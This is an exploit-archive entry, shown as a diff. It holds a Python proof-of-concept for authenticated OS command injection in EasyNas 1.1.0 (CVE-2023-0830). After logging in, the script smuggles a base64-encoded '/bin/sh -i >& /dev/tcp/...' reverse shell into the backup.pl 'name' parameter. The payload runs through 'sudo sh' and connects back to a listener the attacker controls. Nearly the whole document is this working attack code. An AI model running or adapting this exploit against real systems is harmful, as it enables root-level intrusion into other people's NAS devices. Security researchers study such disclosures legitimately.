@@ -1,0 +1,81 @@
+id: 38500
+date: 04/06/2023
+title: EasyNas 1.1.0 - OS Command Injection Exploit
+author: Ivan Spiridonov
+cves: 
+
+# Exploit Title: EasyNas 1.1.0 - OS Command Injection
+# Exploit Author: Ivan Spiridonov (ivanspiridonov@gmail.com)
+# Author Blog: https://xbz0n.medium.com
+# Version: 1.0.0
+# Vendor home page : https://www.easynas.org
+# Authentication Required: Yes
+# CVE : CVE-2023-0830
+
+#!/usr/bin/python3
+
+import requests
+import sys
+import base64
+import urllib.parse
+import time
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+# Disable the insecure request warning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+if len(sys.argv) < 6:
+    print("Usage: ./exploit.py http(s)://url username password listenerIP listenerPort")
+    sys.exit()
+
+url = sys.argv[1]
+user = sys.argv[2]
+password = sys.argv[3]
+
+# Create the payload
+payload = "/bin/sh -i >& /dev/tcp/{}/{} 0>&1".format(sys.argv[4], sys.argv[5])
+
+# Encode the payload in base64
+payload = base64.b64encode(payload.encode()).decode()
+
+# URL encode the payload
+payload = urllib.parse.quote(payload)
+
+# Create the login data
+login_data = {
+    'usr':user,
+    'pwd':password,
+    'action':'login'
+}
+
+# Create a session
+session = requests.Session()
+
+# Send the login request
+print("Sending login request...")
+login_response = session.post(f"https://{url}/easynas/login.pl", data=login_data, verify=False)
+
+# Check if the login was successful
+if 'Login to EasyNAS' in login_response.text:
+    print("Unsuccessful login")
+    sys.exit()
+else:
+    print("Login successful")
+
+
+# send the exploit request
+timeout = 3
+
+try:
+    exploit_response = session.get(f'https://{url}/easynas/backup.pl?action=backup&menu=none&.submit=Backup&name=%7cecho+{payload}+%7c+base64+-d+%7c+sudo+sh+%7c%7ca+%23', headers={'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0'}, timeout = timeout, verify=False)
+    if exploit_response.status_code != 200:
+        print("[+] Everything seems ok, check your listener.")
+    else:
+        print("[-] Exploit failed, system is patched or credentials are wrong.")
+
+except requests.exceptions.ReadTimeout:
+    print("[-] Everything seems ok, check your listener.")
+    sys.exit()
+
+#  0day.today [2023-04-19]  #
